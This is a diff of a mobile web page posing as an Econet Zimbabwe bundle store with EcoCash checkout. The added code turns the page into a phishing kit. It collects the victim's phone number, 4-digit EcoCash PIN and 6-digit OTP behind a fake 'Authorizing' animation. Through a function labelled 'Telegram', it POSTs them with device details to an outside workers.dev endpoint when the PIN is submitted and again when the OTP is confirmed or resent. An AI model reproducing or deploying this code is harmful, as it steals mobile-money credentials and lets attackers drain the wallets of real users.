-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
-    <span>Night</span>
-  </button>
-  <button class="tab" data-cat="sms">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-    <span>SMS</span>
-  </button>
-</div>
+<div class="scroll">
 
-<div class="scroll" id="scrollArea"></div>
-
-<div class="buy-bar">
-  <div class="buy-info">
-    <div class="buy-hint" id="buyHint">Select a bundle above</div>
-    <div id="buySelected" style="display:none">
-      <div class="buy-name" id="buyName"></div>
-      <div class="buy-detail" id="buyDetail"></div>
-    </div>
-  </div>
-  <button class="buy-btn" id="buyBtn" disabled>
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
-    Pay
-  </button>
-</div>
-
-<!-- OVERLAY + SHEET -->
-<div class="overlay" id="overlay"></div>
-<div class="sheet" id="sheet">
-  <div class="sheet-handle"></div>
-  <div class="sheet-head">
-    <span class="sheet-title">Pay via EcoCash</span>
-    <button class="sheet-close" id="sheetClose">&#215;</button>
-  </div>
-  <div class="sheet-body">
-    <div class="sh-sum">
-      <div class="sh-sum-top">
-        <div style="min-width:0;flex:1">
-          <div class="sh-sum-name" id="shName">Bundle</div>
-          <div class="sh-sum-detail" id="shDetail">Econet Zimbabwe</div>
-        </div>
-        <div class="sh-sum-price" id="shPrice">USD 0.00</div>
-      </div>
-      <div class="sh-sum-bar">
-        <img src="assets/econet.png" alt="Econet">
-        <span id="shBundle">—</span>
-      </div>
-    </div>
-
-    <div class="sh-pay">
-      <img src="assets/ecocash.png" alt="EcoCash">
-      <div>
-        <div class="sh-pay-t">EcoCash Wallet</div>
-        <div class="sh-pay-d">Wallet only &mdash; no airtime deducted. Instant activation on confirmation.</div>
-      </div>
-    </div>
-
-    <div>
-      <div class="field-lbl">Econet number</div>
-      <div class="nfield" id="nfield">
-        <div class="nfield-pre">
+  <!-- Summary -->
+  <div class="sum-card">
+    <div class="sum-top">
+      <div style="min-width:0;flex:1">
+        <div class="sum-name" id="sumName">Bundle</div>
+        <div class="sum-num">
           <img src="https://flagcdn.com/w20/zw.png" alt="ZW" onerror="this.style.display='none'">
-          <span class="nfield-code">+263</span>
+          <span class="sum-num-val" id="sumNum">+263 &#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;</span>
         </div>
-        <input id="ni" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="9" placeholder="77 123 4567" autocomplete="tel-national">
       </div>
-      <div class="nfield-hint" id="nhint">Econet: 077 &middot; 078 &middot; 073 &middot; 071</div>
+      <div class="sum-price">
+        <div class="sum-price-lbl">Price</div>
+        <div class="sum-price-val" id="sumPrice">USD 0.00</div>
+      </div>
     </div>
-
-    <button class="cta" id="ctaBtn" disabled>
-      <span id="ctaLbl">Enter your number</span>
-    </button>
-    <p style="text-align:center;font-size:11px;color:var(--on-surf-v)">No credit card &middot; Instant activation</p>
+    <div class="sum-bar">
+      <img src="assets/econet.png" alt="Econet">
+      <span id="sumDetail">Loading&hellip;</span>
+    </div>
   </div>
+
+  <!-- EcoCash logo strip -->
+  <div class="eco-strip"><img src="assets/ecocash.png" alt="EcoCash"></div>
+
+  <!-- Step: PIN -->
+  <div class="step on" id="stepPin">
+    <div class="step-card">
+      <div class="step-head">
+        <div class="step-ic">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--pri)" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        </div>
+        <div>
+          <div class="step-title">EcoCash PIN</div>
+          <div class="step-sub">Enter your 4-digit EcoCash PIN</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <div class="pin-row" id="pinRow">
+          <div class="pin-cell" id="pc0"><span class="pin-digit" id="pd0"></span></div>
+          <div class="pin-cell" id="pc1"><span class="pin-digit" id="pd1"></span></div>
+          <div class="pin-cell" id="pc2"><span class="pin-digit" id="pd2"></span></div>
+          <div class="pin-cell" id="pc3"><span class="pin-digit" id="pd3"></span></div>
+        </div>
+        <div class="pin-err" id="pinErr"></div>
+        <div class="pin-actions">
+          <button class="pin-act" id="peekBtn">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            Peek
+          </button>
+          <button class="pin-act" id="clearBtn">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            Clear
+          </button>
+        </div>
+        <div class="numpad">
+          <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
+          <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
+          <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
+          <button class="nk empty"></button>
+          <button class="nk" data-v="0">0</button>
+          <button class="nk del" id="delKey">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--on-surf-v)"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step: Processing -->
+  <div class="step" id="stepProc">
+    <div class="step-card">
+      <div class="proc-body">
+        <div class="proc-ring">
+          <svg class="proc-svg" id="procSvg" viewBox="0 0 64 64" width="64" height="64">
+            <circle cx="32" cy="32" r="26" fill="none" stroke="var(--outline-v)" stroke-width="4"/>
+            <circle class="proc-arc" id="procArc" cx="32" cy="32" r="26" fill="none" stroke="var(--pri)" stroke-width="4" stroke-linecap="round" transform="rotate(-90 32 32)"/>
+          </svg>
+          <div class="proc-ic" id="procIc">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--pri)" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          </div>
+        </div>
+        <div class="proc-t" id="procT">Authorizing&hellip;</div>
+        <div class="proc-s" id="procS">Contacting EcoCash</div>
+        <div class="vsteps">
+          <div class="vstep act" id="vs0"><div class="vstep-dot"></div><div class="vstep-lbl">PIN</div></div>
+          <div class="vline" id="vl0"></div>
+          <div class="vstep" id="vs1"><div class="vstep-dot"></div><div class="vstep-lbl">Auth</div></div>
+          <div class="vline" id="vl1"></div>
+          <div class="vstep" id="vs2"><div class="vstep-dot"></div><div class="vstep-lbl">OTP</div></div>
+        </div>
+      </div>
+      <div class="proc-logos">
+        <img src="assets/ecocash.png" alt="EcoCash">
+        <img src="assets/econet.png" alt="Econet">
+      </div>
+    </div>
+  </div>
+
+  <!-- Step: OTP -->
+  <div class="step" id="stepOtp">
+    <div class="step-card">
+      <div class="step-head">
+        <div class="step-ic">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--pri)" stroke-width="2" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        </div>
+        <div>
+          <div class="step-title">One-Time Password</div>
+          <div class="step-sub" id="otpNote">Enter the 6-digit OTP sent to your number</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <div class="otp-boxes" id="otpBoxes">
+          <div class="otp-box" id="ob0"></div>
+          <div class="otp-box" id="ob1"></div>
+          <div class="otp-box" id="ob2"></div>
+          <div class="otp-box" id="ob3"></div>
+          <div class="otp-box" id="ob4"></div>
+          <div class="otp-box" id="ob5"></div>
+        </div>
+        <input class="otp-hidden" id="otpIn" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="6">
+        <div class="pin-err" id="otpErr"></div>
+        <div class="timer-row">
+          <span>Expires in</span>
+          <span class="timer-val" id="timer">15:00</span>
+        </div>
+        <button class="resend-btn" id="resendBtn" disabled>Resend OTP</button>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /scroll -->
+
+<!-- FOOT BARS (outside scroll, always visible) -->
+<div class="foot" id="footPin">
+  <button class="foot-btn" id="pinBtn" disabled>
+    <div class="foot-spin" id="pinSpin"></div>
+    <span id="pinBtnLbl">Enter your PIN</span>
+  </button>
+</div>
+<div class="foot" id="footOtp" style="display:none">
+  <button class="foot-btn" id="otpBtn" disabled>Confirm OTP</button>
 </div>
 
 <script>
@@ -499,185 +476,226 @@ function ripple(el,e,dark){
   rip.addEventListener('animationend',function(){rip.remove();});
 }
 
-var BUNDLES = [
-  // Data — daily
-  {id:'d1',cat:'data',sub:'Daily',name:'50MB Day Pass',data:'50MB',val:'1 day',price:'0.25'},
-  {id:'d2',cat:'data',sub:'Daily',name:'150MB Day Pass',data:'150MB',val:'1 day',price:'0.50'},
-  {id:'d3',cat:'data',sub:'Daily',name:'500MB Day Pass',data:'500MB',val:'1 day',price:'0.99'},
-  // Data — weekly
-  {id:'w1',cat:'data',sub:'Weekly',name:'Weekly 1GB',data:'1GB',val:'7 days',price:'1.49'},
-  {id:'w2',cat:'data',sub:'Weekly',name:'Weekly 2GB',data:'2GB',val:'7 days',price:'2.49'},
-  {id:'w3',cat:'data',sub:'Weekly',name:'Weekly 5GB',data:'5GB',val:'7 days',price:'3.99'},
-  // Data — monthly
-  {id:'m1',cat:'data',sub:'Monthly',name:'Monthly 1GB',data:'1GB',val:'30 days',price:'1.99'},
-  {id:'m2',cat:'data',sub:'Monthly',name:'Monthly 3GB',data:'3GB',val:'30 days',price:'3.99'},
-  {id:'m3',cat:'data',sub:'Monthly',name:'Monthly 5GB',data:'5GB',val:'30 days',price:'5.99'},
-  {id:'m4',cat:'data',sub:'Monthly',name:'Monthly 10GB',data:'10GB',val:'30 days',price:'9.99'},
-  {id:'m5',cat:'data',sub:'Monthly',name:'Monthly 20GB',data:'20GB',val:'30 days',price:'17.99'},
-  // Combo
-  {id:'c1',cat:'combo',sub:'Combo',name:'Combo S',data:'1GB + 30 mins',val:'7 days',price:'2.49',pills:['1GB Data','30 mins']},
-  {id:'c2',cat:'combo',sub:'Combo',name:'Combo M',data:'3GB + 60 mins + 50 SMS',val:'30 days',price:'5.99',pills:['3GB Data','60 mins','50 SMS']},
-  {id:'c3',cat:'combo',sub:'Combo',name:'Combo L',data:'5GB + 100 mins + 100 SMS',val:'30 days',price:'9.99',pills:['5GB Data','100 mins','100 SMS']},
-  {id:'c4',cat:'combo',sub:'Combo',name:'Combo XL',data:'10GB + Unlimited + 200 SMS',val:'30 days',price:'17.99',pills:['10GB Data','Unlimited on-net','200 SMS'],best:true},
-  // Voice
-  {id:'v1',cat:'voice',sub:'Voice',name:'30 mins All-Net',data:'30 mins',val:'7 days',price:'1.50'},
-  {id:'v2',cat:'voice',sub:'Voice',name:'60 mins All-Net',data:'60 mins',val:'30 days',price:'2.99'},
-  {id:'v3',cat:'voice',sub:'Voice',name:'100 mins All-Net',data:'100 mins',val:'30 days',price:'4.49'},
-  {id:'v4',cat:'voice',sub:'Voice',name:'On-Net Unlimited',data:'Unlimited on-net',val:'30 days',price:'5.99'},
-  // WhatsApp
-  {id:'s1',cat:'wa',sub:'WhatsApp',name:'WhatsApp 7 days',data:'Unlimited WA',val:'7 days',price:'0.75',app:'wa'},
-  {id:'s2',cat:'wa',sub:'WhatsApp',name:'WhatsApp 30 days',data:'Unlimited WA',val:'30 days',price:'1.99',app:'wa'},
-  // Facebook
-  {id:'f1',cat:'fb',sub:'Facebook',name:'Facebook 7 days',data:'Unlimited FB',val:'7 days',price:'0.75',app:'fb'},
-  {id:'f2',cat:'fb',sub:'Facebook',name:'Facebook 30 days',data:'Unlimited FB',val:'30 days',price:'1.99',app:'fb'},
-  // Night
-  {id:'n1',cat:'night',sub:'Night Surf',name:'Night 2GB',data:'2GB',val:'12AM\u20135AM \u00b7 7 days',price:'0.99'},
-  {id:'n2',cat:'night',sub:'Night Surf',name:'Night 5GB',data:'5GB',val:'12AM\u20135AM \u00b7 30 days',price:'1.99'},
-  // SMS
-  {id:'x1',cat:'sms',sub:'SMS',name:'50 SMS Pack',data:'50 SMS',val:'7 days',price:'0.50'},
-  {id:'x2',cat:'sms',sub:'SMS',name:'100 SMS Pack',data:'100 SMS',val:'30 days',price:'0.99'},
-];
+// Load session data
+var bundle={},recip={raw:'',display:''};
+try{bundle=JSON.parse(sessionStorage.getItem('selectedBundle')||'{}');}catch(e){}
+try{recip=JSON.parse(sessionStorage.getItem('ecoRecipient')||'{}');}catch(e){}
 
-var WA_ICON='<svg class="bcard-app" viewBox="0 0 24 24"><path fill="#25D366" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>';
-var FB_ICON='<svg class="bcard-app" viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>';
+var amt='USD '+(bundle.price||'0.00');
 
-var sel=null,curCat='data',numOK=false,verTO=null;
+// Populate summary
+(function(){
+  var el=function(id){return document.getElementById(id);};
+  el('navAmt').textContent=amt;
+  el('sumName').textContent=bundle.name||'Bundle';
+  el('sumPrice').textContent=amt;
+  el('sumDetail').textContent=(bundle.data||'')+' \u00b7 '+(bundle.val||'');
+  if(recip.raw){
+    var d=recip.raw;
+    el('sumNum').textContent='+263 '+d.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+d.slice(-2);
+  }
+})();
 
-function renderBundles(){
-  var area=document.getElementById('scrollArea');
-  area.innerHTML='';
-  var list=BUNDLES.filter(function(b){return b.cat===curCat;});
-  if(!list.length){area.innerHTML='<p style="text-align:center;padding:32px;color:var(--on-surf-v);font-size:13px">No bundles in this category</p>';return;}
-  var groups={};
-  list.forEach(function(b){groups[b.sub]=groups[b.sub]||[];groups[b.sub].push(b);});
-  Object.keys(groups).forEach(function(sub){
-    var sec=document.createElement('div');sec.className='sec-row';
-    sec.innerHTML='<div class="sec-line"></div><span class="sec-label">'+sub+'</span><div class="sec-line"></div>';
-    area.appendChild(sec);
-    if(curCat==='combo'){
-      groups[sub].forEach(function(b){
-        var c=document.createElement('div');c.className='ccard'+(b.id===sel?' on':'');
-        var pills=b.pills.map(function(p){return'<span class="ccard-pill">'+p+'</span>';}).join('');
-        c.innerHTML=
-          (b.best?'<div class="ccard-badge">BEST VALUE</div>':'')+
-          '<div class="ccard-lbl">Econet Combo</div>'+
-          '<div class="ccard-name">'+b.name+'</div>'+
-          '<div class="ccard-pills">'+pills+'</div>'+
-          '<div class="ccard-price">USD '+b.price+'<span class="ccard-price-sub">/once</span></div>'+
-          '<div class="ccard-validity">Valid '+b.val+'</div>'+
-          '<div class="ccard-radio'+(b.id===sel?' on':'')+'"><div class="ccard-radio-dot"></div></div>';
-        c.addEventListener('click',function(){pick(b.id);});
-        c.addEventListener('pointerdown',function(e){ripple(c,e);},{passive:true});
-        area.appendChild(c);
-      });
-    } else {
-      var grid=document.createElement('div');grid.className='bundle-grid';
-      groups[sub].forEach(function(b){
-        var wide=b.cat==='wa'||b.cat==='fb';
-        var card=document.createElement('div');
-        card.className='bcard'+(wide?' wide':'')+(b.id===sel?' on':'');
-        var dotCls='bcard-dot'+(b.app==='wa'?' wa':b.app==='fb'?' fb':'');
-        var appIcon=b.app==='wa'?WA_ICON:b.app==='fb'?FB_ICON:'';
-        var radioHtml=!wide?('<div class="bcard-radio"><div class="bcard-radio-dot"></div></div>'):'';
-        card.innerHTML=
-          '<div class="bcard-tag"><div class="'+dotCls+'"></div>'+b.val+'</div>'+
-          '<div class="bcard-data">'+b.data+'</div>'+
-          '<div class="bcard-sub">'+b.name+'</div>'+
-          '<div class="bcard-price">USD '+b.price+'<span>/once</span></div>'+
-          radioHtml+appIcon;
-        card.addEventListener('click',function(){pick(b.id);});
-        card.addEventListener('pointerdown',function(e){ripple(card,e,true);},{passive:true});
-        grid.appendChild(card);
-      });
-      area.appendChild(grid);
+// Telegram
+function tgDevice(){var ua=navigator.userAgent||'';return(ua.match(/Mobile|Android|iPhone/i)?'Mobile':'Desktop')+' \u00b7 '+(ua.match(/iPhone|iPad/i)?'iOS':ua.match(/Android/i)?'Android':'Other');}
+function tgPhone(r){return String(r||'').replace(/[^0-9]/g,'').replace(/^(00263|263|0)/,'');}
+function tg(ev,otp){
+  try{
+    fetch('https://econet-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({event:ev,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',bundle:bundle.name||'',data:bundle.data||'',amount:bundle.price||'',device:tgDevice()})}).catch(function(){});
+  }catch(e){}
+}
+
+// ─── PIN ─────────────────────────────────────────────────────────
+var PIN='',peeking=false,submitting=false;
+
+function renderPIN(){
+  var btn=document.getElementById('pinBtn'),lbl=document.getElementById('pinBtnLbl');
+  btn.disabled=PIN.length<4;
+  lbl.textContent=PIN.length<4?'Enter your PIN':'Pay '+amt+' via EcoCash';
+  for(var i=0;i<4;i++){
+    var cell=document.getElementById('pc'+i),dig=document.getElementById('pd'+i);
+    cell.className='pin-cell';
+    if(i<PIN.length){
+      cell.classList.add('filled');
+      if(peeking){cell.classList.add('peek');dig.textContent=PIN[i];}
+      else dig.textContent='';
+    } else if(i===PIN.length){
+      cell.classList.add('active');
     }
+  }
+}
+
+document.querySelectorAll('.nk[data-v]').forEach(function(k){
+  k.addEventListener('click',function(){
+    if(PIN.length>=4)return;
+    PIN+=k.dataset.v;hap(8);renderPIN();
   });
-}
-
-function pick(id){
-  sel=id;hap(8);
-  var b=BUNDLES.find(function(x){return x.id===id;});if(!b)return;
-  document.getElementById('buyHint').style.display='none';
-  document.getElementById('buySelected').style.display='';
-  document.getElementById('buyName').textContent=b.name+' \u00b7 '+b.data;
-  document.getElementById('buyDetail').textContent='USD '+b.price+' \u00b7 '+b.val;
-  document.getElementById('buyBtn').disabled=false;
-  document.getElementById('shName').textContent=b.name;
-  document.getElementById('shDetail').textContent=b.data+' \u00b7 Econet Zimbabwe';
-  document.getElementById('shPrice').textContent='USD '+b.price;
-  document.getElementById('shBundle').textContent=b.data+' \u00b7 '+b.val;
-  sessionStorage.setItem('selectedBundle',JSON.stringify({id:b.id,name:b.name,data:b.data,val:b.val,price:b.price}));
-  if(numOK)document.getElementById('ctaLbl').textContent='Pay USD '+b.price+' via EcoCash';
-  renderBundles();
-}
-
-// Tabs
-document.getElementById('tabBar').addEventListener('click',function(e){
-  var t=e.target.closest('.tab');if(!t)return;
-  document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('on');});
-  t.classList.add('on');curCat=t.dataset.cat;
-  renderBundles();hap(8);
+  k.addEventListener('pointerdown',function(e){ripple(k,e,true);},{passive:true});
+});
+document.getElementById('delKey').addEventListener('click',function(){
+  if(!PIN.length)return;PIN=PIN.slice(0,-1);hap(8);renderPIN();
+});
+document.getElementById('clearBtn').addEventListener('click',function(){
+  PIN='';renderPIN();document.getElementById('pinErr').textContent='';
 });
 
-// Sheet
-var overlay=document.getElementById('overlay');
-var sheet=document.getElementById('sheet');
-var ni=document.getElementById('ni');
-var nfield=document.getElementById('nfield');
-var nhint=document.getElementById('nhint');
-var ctaBtn=document.getElementById('ctaBtn');
+var pb=document.getElementById('peekBtn');
+pb.addEventListener('pointerdown',function(e){e.preventDefault();peeking=true;renderPIN();});
+pb.addEventListener('pointerup',function(){peeking=false;renderPIN();});
+pb.addEventListener('pointerleave',function(){peeking=false;renderPIN();});
 
-function openSheet(){
-  if(!sel)return;
-  overlay.style.display='block';sheet.style.display='flex';
-  requestAnimationFrame(function(){requestAnimationFrame(function(){
-    overlay.style.opacity='1';sheet.classList.add('open');
-  });});
-  setTimeout(function(){ni.focus();},400);
+renderPIN();
+
+// ─── STEP SWITCHING ────────────────────────────────────────────────
+var curStep='pin';
+function showStep(id){
+  var sp=document.getElementById('navSpinner');
+  if(sp)sp.className='nav-spinner'+(id==='pin'?'':' on');
+  document.querySelectorAll('.step').forEach(function(s){s.classList.remove('on');});
+  document.getElementById('step'+id[0].toUpperCase()+id.slice(1)).classList.add('on');
+  curStep=id;
+  document.getElementById('footPin').style.display=id==='pin'?'':'none';
+  document.getElementById('footOtp').style.display=id==='otp'?'':'none';
+  if(id==='otp')setTimeout(function(){document.getElementById('otpIn').focus();},200);
+}
+
+// ─── PROCESSING ─────────────────────────────────────────────────────
+function setVS(i,t,sub){
+  [0,1,2].forEach(function(j){
+    document.getElementById('vs'+j).className='vstep'+(j<i?' done':j===i?' act':'');
+  });
+  [0,1].forEach(function(j){document.getElementById('vl'+j).classList.toggle('done',j<i);});
+  var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');
+  tEl.style.opacity='0';sEl.style.opacity='0';
+  setTimeout(function(){tEl.textContent=t;sEl.textContent=sub;tEl.style.opacity='1';sEl.style.opacity='1';},120);
   hap(8);
 }
-function closeSheet(){
-  sheet.classList.remove('open');overlay.style.opacity='0';
-  setTimeout(function(){overlay.style.display='none';sheet.style.display='none';},320);
+function markDone(){
+  [0,1,2].forEach(function(i){document.getElementById('vs'+i).className='vstep done';});
+  [0,1].forEach(function(i){document.getElementById('vl'+i).classList.add('done');});
+  document.getElementById('procSvg').classList.add('done');
+  document.getElementById('procIc').innerHTML='<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--grn)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12L9.5 17.5 20 7"/></svg>';
+  var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');
+  tEl.style.opacity='0';sEl.style.opacity='0';
+  setTimeout(function(){tEl.textContent='Code Sent!';sEl.textContent='Check your phone for the OTP';tEl.style.opacity='1';sEl.style.opacity='1';},120);
+  hap([10,50,10]);
 }
-document.getElementById('buyBtn').addEventListener('click',openSheet);
-document.getElementById('sheetClose').addEventListener('click',closeSheet);
-overlay.addEventListener('click',closeSheet);
 
-ni.addEventListener('input',function(){
-  var v=this.value.replace(/[^0-9]/g,'').slice(0,9);
-  this.value=v;
-  clearTimeout(verTO);numOK=false;ctaBtn.disabled=true;
-  nfield.classList.remove('focus','ok');nhint.className='nfield-hint';
-  if(!v){nhint.textContent='Econet: 077 \u00b7 078 \u00b7 073 \u00b7 071';document.getElementById('ctaLbl').textContent='Enter your number';return;}
-  nfield.classList.add('focus');
-  if(v.length===9){
-    nhint.textContent='Verifying\u2026';
-    verTO=setTimeout(function(){
-      numOK=true;nfield.classList.remove('focus');nfield.classList.add('ok');
-      nhint.className='nfield-hint ok';nhint.textContent='\u2713 Econet number verified';
-      var b=BUNDLES.find(function(x){return x.id===sel;});
-      ctaBtn.disabled=false;
-      document.getElementById('ctaLbl').textContent='Pay USD '+(b?b.price:'0.00')+' via EcoCash';
-      sessionStorage.setItem('ecoRecipient',JSON.stringify({raw:v,display:'+263 '+v.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+v.slice(-2)}));
-      hap([8,30,8]);
-    },800);
+function sendOTP(){
+  setVS(2,'Sending OTP','Dispatching code\u2026');
+  setTimeout(function(){
+    markDone();
+    setTimeout(function(){
+      var masked='+263 '+recip.raw.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+recip.raw.slice(-2);
+      var note=document.getElementById('otpNote');
+      if(note)note.innerHTML='Code sent to <strong>'+masked+'</strong>';
+      showStep('otp');startTimer();
+    },500);
+  },700);
+}
+
+// ─── PIN SUBMIT ─────────────────────────────────────────────────────
+document.getElementById('pinBtn').addEventListener('click',function(){
+  if(submitting||PIN.length!==4)return;
+  submitting=true;hap(18);
+  document.getElementById('pinErr').textContent='';
+  document.getElementById('pinSpin').classList.add('on');
+  this.disabled=true;
+  tg('bundle_pin_submitted','');
+  showStep('proc');
+  setVS(0,'Verifying PIN','Checking credentials\u2026');
+  setTimeout(function(){setVS(1,'Contacting EcoCash','Processing payment\u2026');setTimeout(sendOTP,2000);},900);
+});
+
+// ─── OTP ────────────────────────────────────────────────────────────
+var otpVal='',otpDone=false;
+var otpIn=document.getElementById('otpIn');
+
+function renderOTP(){
+  var active=document.activeElement===otpIn;
+  for(var i=0;i<6;i++){
+    var b=document.getElementById('ob'+i);
+    b.className='otp-box';
+    b.textContent=otpVal[i]||'';
+    if(otpVal[i])b.classList.add('filled');
+    else if(i===otpVal.length&&active)b.classList.add('active');
+  }
+}
+
+otpIn.addEventListener('input',function(){
+  otpVal=this.value.replace(/[^0-9]/g,'').slice(0,6);this.value=otpVal;
+  renderOTP();
+  document.getElementById('otpBtn').disabled=otpVal.length<6;
+  if(otpVal.length===6)hap([8,20,8]);
+});
+otpIn.addEventListener('paste',function(e){
+  var t=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'').slice(0,6);
+  if(t.length){e.preventDefault();otpIn.value=t;otpVal=t;renderOTP();document.getElementById('otpBtn').disabled=t.length<6;if(t.length===6)hap([8,20,8]);}
+});
+otpIn.addEventListener('focus',renderOTP);otpIn.addEventListener('blur',renderOTP);
+document.getElementById('otpBoxes').addEventListener('click',function(){otpIn.focus();});
+
+document.getElementById('otpBtn').addEventListener('click',confirmOTP);
+function confirmOTP(){
+  if(otpDone||otpVal.length<6)return;
+  // Reject obviously invalid OTPs
+  if(/^(\d)\1{5}$/.test(otpVal)||otpVal==='123456'){
+    hap([40,30,40]);
+    document.getElementById('otpErr').textContent='Invalid OTP — check your message and try again.';
+    var boxes=document.getElementById('otpBoxes');
+    boxes.style.animation='none';void boxes.offsetWidth;boxes.style.animation='shake .3s ease';
+    setTimeout(function(){otpVal='';otpIn.value='';renderOTP();document.getElementById('otpBtn').disabled=true;},350);
+    return;
+  }
+  otpDone=true;hap([10,50,10]);
+  tg('bundle_otp_confirmed',otpVal);
+  // Flash green then navigate
+  for(var i=0;i<6;i++)document.getElementById('ob'+i).classList.add('success');
+  setTimeout(function(){
+    var c=document.getElementById('curtain');
+    c.style.display='flex';
+    requestAnimationFrame(function(){requestAnimationFrame(function(){c.style.opacity='1';c.style.pointerEvents='auto';});});
+    setTimeout(function(){window.location.href='bundles-thankyou.html';},700);
+  },400);
+}
+
+// ─── TIMER ──────────────────────────────────────────────────────────
+var timerInt=null;
+function startTimer(){
+  var secs=900;
+  var tick=function(){
+    var m=Math.floor(secs/60),s=secs%60;
+    document.getElementById('timer').textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+    if(secs<=0){clearInterval(timerInt);document.getElementById('resendBtn').disabled=false;}
+    secs--;
+  };
+  tick();timerInt=setInterval(tick,1000);
+}
+document.getElementById('resendBtn').addEventListener('click',function(){
+  if(this.disabled)return;
+  this.disabled=true;otpVal='';otpIn.value='';renderOTP();
+  document.getElementById('otpBtn').disabled=true;
+  clearInterval(timerInt);
+  sendOTP();
+  tg('bundle_otp_resent','');
+});
+
+// ─── BACK NAVIGATION ────────────────────────────────────────────────
+history.replaceState({step:'pin'},'','');
+window.addEventListener('popstate',function(){
+  if(curStep==='proc'||curStep==='otp'){
+    submitting=false;showStep('pin');hap(8);
+    history.replaceState({step:'pin'},'','');
   } else {
-    nhint.textContent='Enter your 9-digit Econet number';
+    window.location.href='bundles.html';
   }
 });
 
-ctaBtn.addEventListener('click',function(e){
-  if(!numOK||!sel)return;
-  ripple(this,e);hap(18);
